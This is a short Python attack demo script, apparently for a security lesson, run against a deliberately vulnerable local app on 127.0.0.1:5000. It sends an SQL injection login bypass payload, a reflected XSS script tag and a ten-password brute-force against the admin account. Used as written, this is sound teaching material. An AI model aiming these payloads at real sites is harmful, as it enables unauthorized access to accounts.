"""
ATTACK DEMO SCRIPT
Run this AFTER starting vulnerable_app.py (python vulnerable_app.py)
Demonstrates:
  1. SQL Injection login bypass
  2. XSS payload reflection
  3. Simple brute-force attempt
Use only against your own local app.
"""

import requests
import time

TARGET = "http://127.0.0.1:5000/"


def sql_injection_attack():
    print("\n[1] Attempting SQL Injection login bypass...")
    payload = {
        "username": "admin' -- ",
        "password": "anything"
    }
    r = requests.post(TARGET, data=payload)
    if "Welcome" in r.text:
        print("    SUCCESS: Logged in without valid password! (SQLi worked)")
    else:
        print("    Blocked or failed.")


def xss_attack():
    print("\n[2] Attempting XSS payload injection...")
    payload = {
        "username": "<script>alert('XSS')</script>",
        "password": "wrongpass"
    }
    r = requests.post(TARGET, data=payload)
    if "<script>alert('XSS')</script>" in r.text:
        print("    SUCCESS: Raw script tag reflected in response (XSS works)")
    else:
        print("    Blocked or sanitized.")


def brute_force_attack():
    print("\n[3] Attempting brute-force login (10 guesses)...")
    guesses = ["123456", "password", "admin", "qwerty", "letmein",
               "SuperSecret123", "test", "root", "abc123", "welcome"]
    for g in guesses:
        r = requests.post(TARGET, data={"username": "admin", "password": g})
        status = "SUCCESS" if "Welcome" in r.text else "fail"
        print(f"    tried '{g}' -> {status}")
        if status == "SUCCESS":
            print("    Brute-force succeeded, no lockout in place!")
            break
        time.sleep(0.2)


if __name__ == "__main__":
    sql_injection_attack()
    xss_attack()
    brute_force_attack()
